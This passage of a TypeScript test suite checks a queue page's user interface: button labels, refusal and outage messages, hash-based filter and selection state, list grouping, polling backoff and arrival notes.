    { name: "Send order on a blank box asks for the order", draft: { text: "  " }, label: "Send order", calls: [["setDraft", 41, { error: "Write the order, then send." }]] },
  ];
  for (const row of reportRows) {
    test(row.name, () => {
      const { calls, tree } = foot(buildItem({ kind: "report" }), row.draft);
      press(tree, row.label);
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  // which button carries the ink follows the box; order and labels never change
  const inkRows = [
    { name: "an empty box", draft: {}, ink: "Mark as read" },
    { name: "a box with text", draft: { text: "rebase" }, ink: "Send order" },
  ];
  for (const row of inkRows) {
    test(`the report's ink button with ${row.name} is ${row.ink}, the order staying Mark as read then Send order`, () => {
      const buttons = findNodes(foot(buildItem({ kind: "report" }), row.draft).tree, (node) => node.type === "button" && /\bbtn lg\b/.test(String(node.props.className)));
      assert.deepEqual(buttons.map((node) => collectText(node)), ["Mark as read", "Send order"]);
      assert.deepEqual(buttons.filter((node) => /\bprimary\b/.test(String(node.props.className))).map((node) => collectText(node)), [row.ink]);
    });
  }
});

// spacing reads the role-key ladder (index.html tailwind config) → a number or a px value in a queue node is drift
const NUMERIC_SPACING_CLASS = /(^|\s)-?(p|m|gap|space)(x|y|t|r|b|l|s|e)?-(\d|\[)/;

describe("the queue page spaces on role keys only", () => {
  const data = {
    items: [
      buildItem({
        id: 1,
        status: "answered",
        isApprovalClass: true,
        session: buildSession({ state: "live" }),
        resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: null }],
      }),
      buildItem({ id: 2, kind: "report", linkedDocIds: [43944], status: "unacked", deviation: "unacked", session: buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId: null } }) }),
    ],
    nextCursor: 9,
  };
  const states = [
    { name: "a loaded list with its bands, a deviation and Show more", node: () => render("QueueListQ", { queue: withList(buildQueue().queue, data.items, data.nextCursor) }) },
    { name: "a sheet with a refusal", node: () => renderSheet({ item: data.items[0], queue: buildQueue({ busy: { id: null, error: { id: 1, message: "Refused: x." } } }).queue }) },
    {
      name: "the order view with a ticked row, the composer and a refusal",
      node: () => renderOrders({ composer: { text: "rebase on main", isBusy: false, error: "Refused: x." } }, { selectedIds: [SESSION_ID], isEndedShown: true }),
    },
  ];
  for (const row of states) {
    test(row.name, () => {
      const classes = findNodes(row.node(), () => true).map((node) => String(node.props?.className ?? ""));
      assert.deepEqual(classes.filter((value) => NUMERIC_SPACING_CLASS.test(value)), []);
    });
  }
});

describe("report reply", () => {
  const rows = [
    { name: "a report that takes an order shows the order field in the sheet's foot", isFreeTextAllowed: true, fields: 1 },
    { name: "a report that takes no order shows no order field", isFreeTextAllowed: false, fields: 0 },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const tree = render("SheetFootQ", { item: buildItem({ kind: "report", isFreeTextAllowed: row.isFreeTextAllowed }), draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
      assert.equal(findNodes(tree, (node) => node.type === "textarea").length, row.fields);
    });
  }
});

describe("action refusal copy", () => {
  const rows = [
    { name: "the server's worded reason is shown", answer: { status: 400, data: { error: "free_text_not_allowed", reason: "this report takes no reply" } }, expected: "Refused: this report takes no reply." },
    { name: "a refusal with no reason shows fixed copy", answer: { status: 400, data: { error: "invalid_input", issues: [] } }, expected: "The monitor refused this action. Refresh and try again." },
    { name: "a refusal with no body shows fixed copy", answer: { status: 400, data: null }, expected: "The monitor refused this action. Refresh and try again." },
    { name: "a state change names the refresh", answer: { status: 409, data: { error: "conflict", reason: "item is answered" } }, expected: "Refused: the item changed state. Refresh to see where it is now." },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getActionErrorQ", row.answer), row.expected));
});

describe("refusal lines", () => {
  const message = "Refused: the item changed state. Refresh to see where it is now.";
  const rows = [
    { name: "a refused sheet action", node: () => renderSheet({ item: buildItem({ id: 1 }), queue: buildQueue({ busy: { id: null, error: { id: 1, message } } }).queue }) },
    {
      name: "a refused send",
      node: () => renderOrders({ composer: { text: "rebase on main", isBusy: false, error: message } }, { selectedIds: [SESSION_ID] }),
    },
  ];
  for (const row of rows) {
    test(`${row.name} is an alert led by the crit glyph, toned whole`, () => {
      const alerts = findNodes(row.node(), (node) => node.props?.role === "alert" && /\btext-crit\b/.test(String(node.props?.className ?? "")));
      assert.equal(alerts.length, 1, row.name);
      const text = collectText(alerts[0] as RenderedNode);
      assert.deepEqual([text.startsWith((realUi.TONE_GLYPH as Record<string, string>).crit), text.endsWith(message)], [true, true], text);
    });
  }
});

describe("queue filter bar", () => {
  const items = [
    buildItem({ id: 1, session: buildSession({ profileLabel: "work-dev" }) }),
    buildItem({ id: 2, session: buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal", cwdTail: "wt/owner-queue" }) }),
  ];
  const renderBar = (filter: Record<string, string>) => {
    const picks: unknown[] = [];
    const tree = render("QueueFilterBarQ", { items, filter, onFilter: (next: unknown) => picks.push(next) });
    const [bar] = findNodes(tree, (node) => node.props.atom === "FilterBar");
    const triggers = Object.fromEntries(findNodes(tree, (node) => node.props.atom === "FilterTrigger").map((node) => [node.props.axis, node.props]));
    return { bar, triggers, picks };
  };

  // the rail is the Session filter → the bar holds the Account axis alone (spec §9.1 → Scope)
  const rows = [
    { name: "at defaults the Account trigger reads All and the reset stays hidden", filter: { profile: "", session: "" }, account: "All", isApplied: false },
    { name: "a chosen account names that account and shows the reset", filter: { profile: "personal", session: "" }, account: "personal", isApplied: true },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { bar, triggers } = renderBar(row.filter);
      assert.deepEqual(Object.keys(triggers), ["Account"]);
      assert.equal(triggers.Account?.value, row.account);
      assert.equal(bar?.props.isApplied, row.isApplied);
    });
  }

  test("Reset filters returns the account to All and keeps the rail's scope", () => {
    const { bar, picks } = renderBar({ profile: "personal", session: SESSION_ID });
    (bar?.props.onReset as () => void)();
    assert.deepEqual(getPlain(picks), [{ profile: "", session: SESSION_ID }]);
  });

  test("a chosen value no loaded item carries stays an option, so its trigger still names it", () => {
    const { triggers } = renderBar({ profile: "archived", session: "" });
    assert.equal(triggers.Account?.value, "archived");
    assert.ok((triggers.Account?.options as Array<{ key: string }>).some((option) => option.key === "archived"));
  });
});

describe("filter state in the hash", () => {
  const load = async (hash: string) => {
    const location = { hash };
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub(), location, history: { replaceState: (_state: unknown, _title: string, url: string) => { location.hash = url; } } },
    })) as ScreenModule;
    return { module, location };
  };
  const rows = [
    { name: "both axes round-trip through the screen query", start: "#queue", filter: { profile: "work-dev", session: SESSION_ID } },
    { name: "one axis round-trips and the other stays All", start: "#queue?profile=old", filter: { profile: "", session: SESSION_ID } },
    { name: "defaults leave a bare screen hash and read back as defaults", start: "#queue?profile=personal", filter: { profile: "", session: "" } },
  ];
  for (const row of rows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setFilterHashQ as (filter: unknown) => void)(row.filter);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), row.filter);
    });
  }

  // one hash writer merges every key → a filter write never erases the selected item or the mode (spec §4.3 → Selection)
  const mergeRows = [
    { name: "a filter write keeps the selected item and the mode", start: "#queue?item=41&view=orders&to=a,b", patch: { profile: "work-dev", session: "" }, expected: { session: "", profile: "work-dev", item: "41", to: "a,b", view: "orders" } },
    { name: "an item write keeps the filter", start: "#queue?profile=personal&session=s1", patch: { item: "7" }, expected: { session: "s1", profile: "personal", item: "7", to: "", view: "" } },
    { name: "an emptied key leaves the hash and the others stay", start: "#queue?item=7&profile=personal", patch: { item: "" }, expected: { session: "", profile: "personal", item: "", to: "", view: "" } },
  ];
  for (const row of mergeRows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setHashStateQ as (patch: unknown) => void)(row.patch);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getHashStateQ as () => unknown)()), row.expected);
    });
  }
});

describe("list groups", () => {
  const gersona = buildSession({ id: "a1", name: "gersona" });
  const yoaida = buildSession({ id: "b2", name: "yoaida" });
  const order = (id: number, session: unknown, sendId: string | null, answeredAt = "2026-11-12T12:20:00.000Z") =>
    buildItem({ id, kind: "message", status: "delivered", body: "rebase", answeredAt, sendId, session });
  const getShape = (items: unknown[]) =>
    call<Array<{ key: string; label: string; rows: Array<{ id: number; copies: Array<{ id: number }> }> }>>("getGroupsQ", items)
      .map((group) => ({ key: group.key, rows: group.rows.map((row) => [row.id, row.copies.map((copy) => copy.id)]) }));

  test("open decisions, then open reports, then everything else, each in server order, and an empty group is left out", () => {
    const items = [
      buildItem({ id: 1, kind: "report" }),
      buildItem({ id: 2, status: "answered" }),
      buildItem({ id: 3 }),
      buildItem({ id: 4, kind: "report", status: "answered" }),
      buildItem({ id: 5 }),
    ];
    assert.deepEqual(getShape(items), [
      { key: "decisions", rows: [[3, [3]], [5, [5]]] },
      { key: "reports", rows: [[1, [1]]] },
      { key: "inDelivery", rows: [[2, [2]], [4, [4]]] },
    ]);
    assert.deepEqual(getShape([buildItem({ id: 9, kind: "report" })]).map((group) => group.key), ["reports"]);
  });

  const foldRows = [
    { name: "the copies of one send fold into one row under its lowest id", items: [order(12, yoaida, "s-1"), order(11, gersona, "s-1"), order(13, gersona, "s-2")], expected: [[11, [11, 12]], [13, [13]]] },
    { name: "copies with no send id fold by equal time and text", items: [order(21, gersona, null), order(22, yoaida, null), order(23, yoaida, null, "2026-11-12T12:21:00.000Z")], expected: [[21, [21, 22]], [23, [23]]] },
  ];
  for (const row of foldRows) test(row.name, () => assert.deepEqual(getShape(row.items)[0]?.rows, row.expected));
});

describe("selection", () => {
  const groups = call("getGroupsQ", [buildItem({ id: 5, kind: "report" }), buildItem({ id: 3 }), buildItem({ id: 8, kind: "message", status: "delivered", sendId: "s", session: buildSession({ id: "b2" }) }), buildItem({ id: 7, kind: "message", status: "delivered", sendId: "s" })]);
  const rows = [
    { name: "a loaded item named in the hash is selected", hashId: "5", expected: 5 },
    { name: "a copy named in the hash selects its folded row", hashId: "8", expected: 7 },
    { name: "an item the list does not hold falls back to the first row of the first group", hashId: "99", expected: 3 },
    { name: "no item in the hash selects the first row of the first group", hashId: "", expected: 3 },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getSelectedIdQ", groups, row.hashId), row.expected));
  test("an empty list selects nothing", () => assert.equal(call("getSelectedIdQ", [], ""), null));

  const presses = [
    { name: "an order to a session opens the Orders mode at it", item: { kind: "message", status: "answered", sendId: "s" }, opens: 1 },
    { name: "an order written on a report opens the Orders mode at it", item: { kind: "report", status: "answered", answer: { code: null, text: "ship it" } }, opens: 1 },
    { name: "an answered decision opens on the sheet", item: { status: "answered", answer: { code: "R1", text: null } }, opens: 0 },
    { name: "an open decision opens on the sheet", item: {}, opens: 0 },
  ];
  for (const row of presses) {
    test(`pressing a list row: ${row.name}`, () => {
      const calls: string[] = [];
      const listed = call<Array<{ rows: unknown[] }>>("getGroupsQ", [buildItem({ id: 7, ...row.item })]).flatMap((group) => group.rows)[0];
      const tree = render("QueueRowQ", { row: listed, isSelected: false, view: { isNameShown: true, isAccountShown: false }, onSelect: () => calls.push("select"), onOrder: () => calls.push("order") });
      const [option] = findNodes(tree, (node) => node.props?.role === "option");
      (option?.props.onClick as () => void)();
      assert.deepEqual(calls, [row.opens ? "order" : "select"]);
    });
  }

  test("an order's recipients are every session its send went to, also those the list's scope leaves out", () => {
    const items = [buildItem({ id: 8, kind: "message", status: "answered", sendId: "s", session: buildSession({ id: "b2" }) }), buildItem({ id: 7, kind: "message", status: "delivered", sendId: "s" }), buildItem({ id: 9, kind: "message", status: "answered", sendId: "t", session: buildSession({ id: "c3" }) })];
    assert.deepEqual(call("getOrderRecipientIdsQ", items, 8), [SESSION_ID, "b2"]);
  });

  test("the thread entry an opened order aims at is the one holding any of its copies; one not loaded → none", () => {
    const entries = call<unknown[]>("getThreadEntriesQ", [buildItem({ id: 8, kind: "message", status: "answered", sendId: "s" }), buildItem({ id: 7, kind: "message", status: "answered", sendId: "s" })]);
    assert.deepEqual([call("getAimedEntryIdQ", entries, 8), call("getAimedEntryIdQ", entries, 40)], [7, null]);
  });
});

describe("what the sheet shows", () => {
  const held = buildItem({ id: 3 });
  const arrived = buildItem({ id: 2 });
  const answered = buildItem({ id: 3, status: "answered", answeredAt: "2026-11-12T12:20:00.000Z" });
  const rows = [
    { name: "an open item on the sheet that the read no longer holds stays on it as left the queue", items: [arrived], hashId: "3", expected: { kind: "left", id: 3 } },
    { name: "a default-selected item that is answered elsewhere stays on the sheet as left the queue", items: [arrived, answered], hashId: "", expected: { kind: "left", id: 3 } },
    { name: "a held item still open keeps the sheet when a new row arrives before it", items: [arrived, held], hashId: "", expected: { kind: "item", id: 3 } },
    { name: "a row the owner selected replaces the held item", items: [arrived], hashId: "2", expected: { kind: "item", id: 2 } },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const sheet = call<{ kind: string; id: number }>("getSheetStateQ", call("getGroupsQ", row.items), row.hashId, { item: held, isHandled: false });
      assert.deepEqual({ kind: sheet.kind, id: sheet.id }, row.expected);
    });
  }

  test("the owner's last open item handled leaves the sheet all handled", () => {
    const sheet = call<{ kind: string; id: number | null }>("getSheetStateQ", call("getGroupsQ", [answered]), "", { item: null, isHandled: true });
    assert.deepEqual({ kind: sheet.kind, id: sheet.id }, { kind: "handled", id: null });
  });

  test("an item that left the queue keeps its sheet, its foot one line and no composer", () => {
    const { queue } = buildQueue();
    const tree = render("QueueSheetQ", { queue: { ...withList(queue, [arrived]), sheet: { kind: "left", id: 3, item: held } } });
    const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
    const foot = renderScreen(card?.props.foot) as RenderedNode;
    assert.equal(collectText(renderScreen(card?.props.title) as RenderedNode).includes("Decision"), true, "the held item's letterhead");
    assert.equal(collectText(foot).replace(/\s+/g, " ").trim(), "ℹ This item left the queue.");
    assert.equal(findNodes(foot, (node) => node.type === "button" || node.type === "textarea").length, 0);
  });

  const handledRows = [
    { name: "all handled counts what is still on its way", items: [answered, buildItem({ id: 9, kind: "message", status: "answered", sendId: "s-9" })], hint: "2 answers and orders are still on their way." },
    { name: "all handled says one thing on its way in the singular", items: [answered], hint: "1 answer or order is still on its way." },
    { name: "all handled with nothing on its way carries no count line", items: [], hint: undefined },
  ];
  test("with no row on the sheet, the first row holds the list's one tab stop", () => {
    const queue = withList(buildQueue().queue, [answered, buildItem({ id: 9, kind: "message", status: "answered", sendId: "s-9" })]);
    const list = render("QueueListQ", { queue: { ...queue, sheet: { kind: "handled", id: null }, selectedId: null } });
    assert.deepEqual(findNodes(list, (node) => node.props?.role === "option").map((node) => node.props.tabIndex), [0, -1]);
  });

  for (const row of handledRows) {
    test(row.name, () => {
      const queue = withList(buildQueue().queue, row.items);
      const tree = render("QueueSheetQ", { queue: { ...queue, sheet: { kind: "handled", id: null } } });
      const [empty] = findNodes(tree, (node) => node.props?.atom === "EmptyState");
      assert.deepEqual({ message: empty?.props.message, hint: empty?.props.hint }, { message: "All handled", hint: row.hint });
    });
  }
});

describe("after the owner acts on the last open item", () => {
  const act = async (action: "answerItem" | "later") => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
    })) as ScreenModule;
    const selected: unknown[] = [];
    const actions = (module.useQueueActionsQ as (deps: unknown) => Record<string, (id: number, body?: unknown) => Promise<void>>)({
      list: { status: "ready", data: { items: [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })], nextCursor: null } },
      filter: { profile: "", session: "" },
      setList: () => undefined,
      setDrafts: () => undefined,
      setFocus: () => undefined,
      setStatus: () => undefined,
      selectItem: (id: unknown) => selected.push(id),
      reload: () => undefined,
    });
    await actions[action]!(1, { code: "R1" });
    return selected;
  };

  test("an answer selects nothing, so the sheet says all handled", async () => assert.deepEqual(await act("answerItem"), [null]));
  test("a later keeps the item selected, since it is still open", async () => assert.deepEqual(await act("later"), []));
});

describe("Show more", () => {
  test("Show more is the quiet small load-more button every screen uses", () => {
    const [button] = buttonLabelled(render("ShowMoreQ", { count: 100, isBusy: false, onMore: () => undefined }), "Show more");
    assert.equal(button?.props.className, "btn ghost sm");
  });

  test("the next page after the cursor joins the loaded list in queue order", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ items: [buildItem({ id: 3 })], nextCursor: null }) };
      },
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "ready", data: { items: [buildItem({ id: 1 }), buildItem({ id: 2 })], nextCursor: 12 } };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getMoreQ as (deps: unknown) => Promise<void>)({ list, setList });
    const data = getPlain(list.data) as { items: Array<{ id: number }>; nextCursor: number | null };
    assert.match(urls[0] ?? "", /[?&]after=12(&|$)/);
    assert.deepEqual(data.items.map((item) => item.id), [1, 2, 3]);
    assert.equal(data.nextCursor, null);
  });
});

describe("list read", () => {
  const read = async (status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status, json: async () => body }),
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "idle", data: null, error: null };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getListQ as (deps: unknown) => Promise<void>)({ setList });
    return list;
  };

  test("an answer carrying the item list is ready", async () => {
    assert.equal((await read(200, { items: [], nextCursor: null })).status, "ready");
  });

  test("a 2xx answer without an item list is a read failure, never a list to render", async () => {
    const list = await read(200, { rows: [] });
    assert.equal(list.status, "error");
    assert.equal(list.data, null);
  });

  // no sign-in state to hand a refusal to → every refused read is a failure with Retry
  const refusals = [
    { name: "a 503 database outage is a read failure with Retry", status: 503, body: { error: "database_unavailable" }, expected: "error" },
    { name: "a 503 with any other code is a read failure with Retry", status: 503, body: { error: "not_provisioned" }, expected: "error" },
    { name: "a 401 is a read failure with Retry", status: 401, body: { error: "unauthorized" }, expected: "error" },
  ];
  for (const row of refusals) test(row.name, async () => assert.equal((await read(row.status, row.body)).status, row.expected));
});

describe("the page re-reads itself", () => {
  const cadence = [
    { name: "a good read keeps the 15 s step", fails: 0, expected: 15_000 },
    { name: "two failed reads in a row keep the 15 s step", fails: 2, expected: 15_000 },
    { name: "three failed reads in a row slow it to 60 s", fails: 3, expected: 60_000 },
    { name: "more failed reads stay at 60 s", fails: 7, expected: 60_000 },
  ];
  for (const row of cadence) test(`cadence: ${row.name}`, () => assert.equal(call("getPollDelayQ", row.fails), row.expected));

  const stale = [
    { name: "a tab shown again reads at once when its last read is older than 15 s", age: 15_001, expected: true },
    { name: "a tab shown again within 15 s of its last read waits for its timer", age: 14_999, expected: false },
  ];
  for (const row of stale) test(row.name, () => assert.equal(call("isReadStaleQ", 1_000_000, 1_000_000 + row.age), row.expected));

  // the server takes up to 200 per read → a list extended by Show more is read whole up to that cap
  const limits = [
    { name: "a first page reads the page size", loaded: 0, expected: 100 },
    { name: "a list extended by Show more reads every loaded row", loaded: 150, expected: 150 },
    { name: "a list past the server's cap reads the cap", loaded: 350, expected: 200 },
  ];
  for (const row of limits) test(`read size: ${row.name}`, () => assert.equal(call("getListLimitQ", row.loaded), row.expected));

  const merge = (prevItems: unknown[] | null, answerItems: unknown[], nextCursor: number | null = null, prevCursor: number | null = null) =>
    call<{ data: { items: Array<{ id: number; status: string }>; nextCursor: number | null }; arrived: Array<{ id: number }> }>(
      "getMergedDataQ", prevItems === null ? null : { items: prevItems, nextCursor: prevCursor }, { items: answerItems, nextCursor });

  test("a known row takes the read's state, a gone row leaves, and a new decision or report arrives", () => {
    const { data, arrived } = merge(
      [buildItem({ id: 1 }), buildItem({ id: 2 })],
      [buildItem({ id: 1, status: "answered" }), buildItem({ id: 3, kind: "report" }), buildItem({ id: 4 })],
    );
    assert.deepEqual(data.items.map((item) => [item.id, item.status]), [[1, "answered"], [3, "open"], [4, "open"]]);
    assert.deepEqual(arrived.map((item) => item.id), [3, 4]);
  });

  test("the owner's own new order and the first read of the page are no arrivals", () => {
    assert.deepEqual(merge([buildItem({ id: 1 })], [buildItem({ id: 1 }), buildItem({ id: 5, kind: "message", status: "answered" })]).arrived, []);
    assert.deepEqual(merge(null, [buildItem({ id: 1 })]).arrived, []);
  });

  test("rows loaded past the read's last position stay, with their cursor, until a read reaches them", () => {
    const loaded = [buildItem({ id: 1, queuePosition: 1 }), buildItem({ id: 2, queuePosition: 2 }), buildItem({ id: 9, queuePosition: 9 })];
    const { data } = merge(loaded, [buildItem({ id: 1, queuePosition: 1 }), buildItem({ id: 3, queuePosition: 3 })], 3, 9);
    assert.deepEqual(data.items.map((item) => item.id), [1, 3, 9]);
    assert.equal(data.nextCursor, 9);
  });

  const readOnce = async (list: Record<string, unknown>, status: number, body: unknown, isMarked = true) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: uiStub() }, fetch: async () => ({ status, json: async () => body }) })) as ScreenModule;
    let current = list;
    const setList = (next: unknown) => {
      current = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(current) : (next as Record<string, unknown>);
    };
    const result = await (module.getListQ as (deps: unknown) => Promise<{ isGood: boolean; arrived: Array<{ id: number }> }>)({ setList, getList: () => current, isMarked });
    return { list: getPlain(current) as Record<string, unknown> & { data: { items: Array<{ id: number }> } | null; newIds: number[] }, result: getPlain(result) };
  };
  const loadedList = (overrides: Record<string, unknown> = {}) =>
    ({ status: "ready", data: { items: [buildItem({ id: 1 })], nextCursor: null }, error: null, readAt: "2026-11-13T03:10:00.000Z", newIds: [], ...overrides });

  test("a failed read with rows loaded keeps every row and its last read time, and says the read failed", async () => {
    const { list, result } = await readOnce(loadedList(), 503, { error: "database_unavailable" });
    assert.deepEqual(list.data?.items.map((item) => item.id), [1]);
    assert.equal(list.status, "ready");
    assert.equal(list.readAt, "2026-11-13T03:10:00.000Z");
    assert.notEqual(list.error, null);
    assert.equal(result.isGood, false);
  });

  test("a good read after a failed one clears the failure", async () => {
    const { list, result } = await readOnce(loadedList({ error: { sentence: "x" } }), 200, { items: [buildItem({ id: 1 })], nextCursor: null });
    assert.equal(list.error, null);
    assert.equal(result.isGood, true);
  });

  test("an arrival is marked New and reported; an unmarked read reports none and marks none", async () => {
    const answer = { items: [buildItem({ id: 1 }), buildItem({ id: 6 })], nextCursor: null };
    const marked = await readOnce(loadedList({ newIds: [1] }), 200, answer);
    assert.deepEqual(marked.list.newIds, [1, 6]);
    assert.deepEqual(marked.result.arrived.map((item) => item.id), [6]);
    const unmarked = await readOnce(loadedList(), 200, answer, false);
    assert.deepEqual(unmarked.list.newIds, []);
    assert.deepEqual(unmarked.result.arrived, []);
  });

  test("a New mark goes with its row when a read no longer has it", async () => {
    const { list } = await readOnce(loadedList({ newIds: [1] }), 200, { items: [buildItem({ id: 2 })], nextCursor: null }, false);
    assert.deepEqual(list.newIds, []);
  });

  const notes = [
    { name: "one arrival names its kind, its session and its title", arrived: [buildItem({ session: buildSession({ name: "yoaida" }) })], expected: "New decision from yoaida: Pick the migration order" },
    { name: "a report names itself a report", arrived: [buildItem({ kind: "report", title: "Nightly sweep done", session: buildSession({ name: "yoaida" }) })], expected: "New report from yoaida: Nightly sweep done" },
    { name: "several arrivals are counted", arrived: [buildItem({ id: 1 }), buildItem({ id: 2 }), buildItem({ id: 3 })], expected: "3 new items" },
  ];
  for (const row of notes) test(`arrival note: ${row.name}`, () => assert.equal(call("getArrivalNoteQ", row.arrived), row.expected));

  test("a read asked for while one is in flight joins it; a fresh one runs after it", async () => {
    const flight = { current: null as Promise<unknown> | null };
    const started: string[] = [];
    const start = (label: string) => () => { started.push(label); return Promise.resolve(label); };
    const join = screen.getJoinedReadQ as (flight: unknown, start: () => Promise<unknown>, isFresh?: boolean) => Promise<unknown>;
    const first = join(flight, start("tick"));
    const joined = join(flight, start("refresh"));
    const fresh = join(flight, start("action"), true);
    assert.deepEqual(await Promise.all([first, joined, fresh]), ["tick", "tick", "action"]);
    assert.deepEqual(started, ["tick", "action"]);
    assert.equal(flight.current, null);
  });

  test("each tick schedules the next once it settles: three failures in a row slow the chain, a good read restores the step", async () => {
    const delays: number[] = [];
    let due: (() => Promise<void>) | null = null;
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      setTimeout: (run: () => Promise<void>, ms: number) => { delays.push(ms); due = run; return delays.length; },
      clearTimeout: () => undefined,
    })) as ScreenModule;
    const answers = [false, false, false, true];
    (module.createReadClockQ as (tick: () => Promise<boolean | undefined>) => unknown)(async () => answers.shift());
    for (let index = 0; index < 4; index += 1) await (due as unknown as () => Promise<void>)();
    assert.deepEqual(delays, [15_000, 15_000, 15_000, 60_000, 15_000]);
  });

  const arrivalRows = [
    { name: "one arrival in the Orders head names its kind and session", arrived: [buildItem({ session: buildSession({ name: "yoaida" }) })], text: "New Decision from yoaida · Show" },
    { name: "several arrivals in the Orders head are counted", arrived: [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report" })], text: "New 2 items · Show" },
    { name: "no arrival leaves the Orders head's status line empty", arrived: [], text: "" },
  ];
  for (const row of arrivalRows) {
    test(row.name, () => {
      const shown: unknown[] = [];
      const tree = render("OrdersArrivalQ", { arrived: row.arrived, onShow: () => shown.push(true) });
      const [line] = findNodes(tree, (node) => node.props?.role === "status");
      assert.equal(collectText(line as RenderedNode).replace(/\s+/g, " ").trim(), row.text);
      for (const button of buttonLabelled(tree, "Show")) (button.props.onClick as () => void)();
      assert.equal(shown.length, row.arrived.length > 0 ? 1 : 0);
    });
  }

  test("an arrived row carries the solid New badge at the start of its meta line, and its name leads with New", () => {
    const row = call<{ id: number }>("getSingleRowQ", buildItem());
    const view = { isNameShown: true, isAccountShown: false, tabStopId: 41 };
    const rowOf = (isNew: boolean) => {
      const [option] = findNodes(render("QueueRowQ", { row, isSelected: false, isNew, view, onSelect: () => undefined, onOrder: () => undefined }), (node) => node.props?.role === "option");
      return { label: String(option?.props["aria-label"]), badges: findNodes(option as RenderedNode, (node) => node.props?.atom === "Badge" && node.props.fill === "solid").map((node) => collectText(node)) };
    };
    assert.deepEqual(rowOf(true).badges, ["New"]);
    assert.match(rowOf(true).label, /^New, Decision from /);
    assert.deepEqual(rowOf(false).badges, []);
    assert.doesNotMatch(rowOf(false).label, /^New/);
  });
});

describe("one outage reads one way across the page", () => {
  const outages = [
    { name: "no answer at all", answer: { status: 0, data: null, error: new TypeError("Failed to fetch") } },
    { name: "a database outage", answer: { status: 503, data: { error: "database_unavailable" } } },
    { name: "an unknown server error", answer: { status: 500, data: { error: "queue_environment_failure" } } },
  ];
  const others = [
    { name: "an unknown refusal", answer: { status: 415, data: null } },
    { name: "a 2xx answer without the expected list", answer: { status: 200, data: { rows: [] } } },
  ];
  type Answer = { status: number; data: unknown; error?: Error };
  const fetchFor = (answer: Answer) => async () => {
    if (answer.status === 0) throw answer.error;
    return { status: answer.status, json: async () => answer.data };
  };
  const getCard = (answer: Answer) => {
    const failure = call<{ sentence: string; next: string; detail: string }>("getReadFailureQ", answer);
    const [card] = findNodes(render("QueueFailureQ", { failure, onRetry: () => undefined }), (node) => node.props?.atom === "AlertCard");
    return { failure, card };
  };
  const getRegionText = async (answer: Answer) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: realUi }, fetch: fetchFor(answer) })) as ScreenModule;
    let region = realUi.INITIAL_REGION_STATE as { error: unknown };
    const setResumes = (next: (prev: unknown) => typeof region) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    const element = realUiReact.createElement(realUi.RegionUnavailable, { source: "recent automatic resumes", error: region.error });
    return collectText(renderScreen(element) as RenderedNode);
  };

  for (const row of [...outages, ...others]) {
    test(`the list card gives the resume region's next step, the raw answer behind Details: ${row.name}`, async () => {
      const { failure, card } = getCard(row.answer);
      const regionText = await getRegionText(row.answer);
      assert.ok(regionText.includes(String(card?.props.body)), `card "${card?.props.body}" | region "${regionText}"`);
      assert.doesNotMatch(`${card?.props.title} ${card?.props.body}`, /HTTP|\d{3}|_/);
      assert.equal(card?.props.details, failure.detail);
    });
  }

  for (const row of outages) {
    test(`an owner action on the same outage gives the card's next step: ${row.name}`, () => {
      const { failure } = getCard(row.answer);
      assert.equal(call("getActionErrorQ", row.answer), failure.next);
    });
  }

  // action lines carry no Details → an unanswered request in any browser wording reads as the server not answering
  test("an owner action on an unanswered request in unrecognised browser wording names the server, never Details", () => {
    const answer = { status: 0, data: null, error: new TypeError("The network connection was lost.") };
    const { next } = getCard(outages[0].answer).failure;
    const line = call<string>("getActionErrorQ", answer);
    assert.equal(line, next);
    assert.doesNotMatch(line, /Details/);
  });

  test("a database outage names the database on the card and in the region", async () => {
    const answer = { status: 503, data: { error: "database_unavailable" } };
    assert.match(String(getCard(answer).card?.props.body), /database/);
    assert.match(await getRegionText(answer), /database/);
  });

});

describe("page header freshness", () => {
  const readAt = () => new Date().toISOString();
  const list = (overrides: Record<string, unknown> = {}) => ({ status: "ready", data: { items: [] }, error: null, readAt: readAt(), ...overrides });
  const resumes = (overrides: Record<string, unknown> = {}) => ({ ...READY_RESUMES, ...overrides });
  const getHeader = (queue: Record<string, unknown>) => {
